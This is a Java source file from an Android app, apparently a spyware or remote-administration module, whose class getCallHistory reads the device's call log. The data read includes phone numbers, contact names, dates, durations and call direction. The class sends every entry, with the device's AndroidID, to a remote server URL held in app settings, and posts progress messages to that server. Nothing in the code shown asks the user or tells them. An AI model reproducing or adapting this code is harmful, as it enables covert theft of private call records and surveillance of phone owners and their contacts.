package u.can.i.up.expert.utils;

import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.provider.CallLog;

import java.io.UnsupportedEncodingException;
import java.util.Date;

import u.can.i.up.expert.common.DataSet;
import u.can.i.up.expert.common.Factory;

/**
 * Created by lczgywzyy on 2015/1/13.
 */
public class getCallHistory extends AsyncTask<String, Void, String> {
    String j = "";
    public getCallHistory(String j) {
        this.j = j;
    }
    @Override
    protected String doInBackground(String... params) {
        String strOrder = CallLog.Calls.DATE + " DESC";
        Uri callUri = Uri.parse("content://call_log/calls");
        Cursor managedCursor = DataSet.getInstance().myService.getApplicationContext().getContentResolver().query(callUri, null, null, null, strOrder);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        int name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
        int i = 0;
        while (managedCursor.moveToNext()) {
            if(i<Integer.parseInt(j))
            {
                String phNumber = managedCursor.getString(number);
                String nameS = managedCursor.getString(name);
                String callType = managedCursor.getString(type);
                String callDate = managedCursor.getString(date);
                Date callDayTime = new Date(Long.valueOf(callDate));
                String callDuration = managedCursor.getString(duration);
                String dir = null;

                int dircode = Integer.parseInt(callType);
                switch (dircode) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "OUTGOING";
                        break;

                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "INCOMING";
                        break;

                    case CallLog.Calls.MISSED_TYPE:
                        dir = "MISSED";
                        break;
                }
                try {
                    Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "["+dir+"] " + "["+phNumber+"] " + "[" + nameS + "] "+ "["+callDate+"] " + "["+callDayTime+"] " + "[Duration: "+callDuration+" seconds]");
                } catch (UnsupportedEncodingException e) {

                    e.printStackTrace();
                }
            }
            i++;
        }
        managedCursor.close();

        return "Executed";
    }
    @Override
    protected void onPostExecute(String result) {
        PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).edit().putBoolean("Get",false).commit();
        try {
            Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Call History Complete");
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }
    }
    @Override
    protected void onPreExecute() {
        while(PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getBoolean("Get",false) == true)
        {
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        try {
            Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Getting Call History");
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }
        PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).edit().putBoolean("Get",true).commit();
    }
    @Override
    protected void onProgressUpdate(Void... values) {
    }
}
